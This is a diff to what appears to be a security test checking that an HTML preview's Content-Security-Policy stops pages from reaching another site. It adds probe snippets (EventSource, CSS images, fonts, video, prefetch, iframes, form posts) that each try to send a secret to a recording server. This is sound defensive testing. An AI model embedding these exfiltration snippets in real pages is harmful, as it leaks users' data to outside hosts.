@@ -21,10 +21,15 @@
  * another port stands for "another website" and records every request it gets.
  *
  * Cases:
- *   - requests: fetch, XMLHttpRequest, sendBeacon, WebSocket, an image, a
- *     script, a stylesheet and a form post reach nobody
+ *   - requests: fetch, XMLHttpRequest, sendBeacon, WebSocket, EventSource, an
+ *     image, a CSS background image, a script, a stylesheet, a web font, a
+ *     video, a prefetch link, a nested frame and a form post into a frame
+ *     reach nobody
  *   - navigation: the page navigating its own frame there (location, meta
- *     refresh) reaches nobody
+ *     refresh, a form posted into its own frame) reaches nobody
+ *
+ * A popup (window.open, a link with target=_blank) is not a case: it needs a
+ * click, and a Content-Security-Policy does not stop it.
  *
  * Every preview frame must load, so a preview that never rendered cannot pass.
  * Chrome is found the way the PDF render finds it (Desktop Commander's cached
@@ -56,9 +61,15 @@ const REQUEST_PROBES = {
     xhr: (to) => `<script>const x = new XMLHttpRequest(); x.open('POST', '${to}/xhr'); x.send('${SECRET}')</script>`,
     beacon: (to) => `<script>try { navigator.sendBeacon('${to}/beacon', '${SECRET}') } catch {}</script>`,
     websocket: (to) => `<script>try { new WebSocket('${to.replace('http:', 'ws:')}/websocket') } catch {}</script>`,
+    eventsource: (to) => `<script>try { new EventSource('${to}/eventsource?d=${SECRET}') } catch {}</script>`,
     image: (to) => `<img src="${to}/image?d=${SECRET}">`,
+    'css-image': (to) => `<div style="background: url('${to}/css-image?d=${SECRET}'); width: 8px; height: 8px"></div>`,
     script: (to) => `<script src="${to}/script?d=${SECRET}"></script>`,
     stylesheet: (to) => `<link rel="stylesheet" href="${to}/stylesheet?d=${SECRET}">`,
+    font: (to) => `<style>@font-face { font-family: probe; src: url('${to}/font?d=${SECRET}') }</style><p style="font-family: probe">${SECRET}</p>`,
+    video: (to) => `<video src="${to}/video?d=${SECRET}" preload="auto"></video>`,
+    prefetch: (to) => `<link rel="prefetch" href="${to}/prefetch?d=${SECRET}">`,
+    frame: (to) => `<iframe src="${to}/frame?d=${SECRET}"></iframe>`,
     form: (to) => `<iframe name="sink"></iframe><form method="POST" action="${to}/form" target="sink"><input name="d" value="${SECRET}"></form><script>document.forms[0].submit()</script>`,
 };
 
@@ -66,6 +77,7 @@ const REQUEST_PROBES = {
 const NAVIGATION_PROBES = {
     location: (to) => `<script>location.href = '${to}/location?d=${SECRET}'</script>`,
     'meta-refresh': (to) => `<meta http-equiv="refresh" content="0;url=${to}/meta-refresh?d=${SECRET}">`,
+    'form-self': (to) => `<form method="POST" action="${to}/form-self"><input name="d" value="${SECRET}"></form><script>document.forms[0].submit()</script>`,
 };
 
 /** A server that records the path of every request it gets, WebSocket upgrades included */
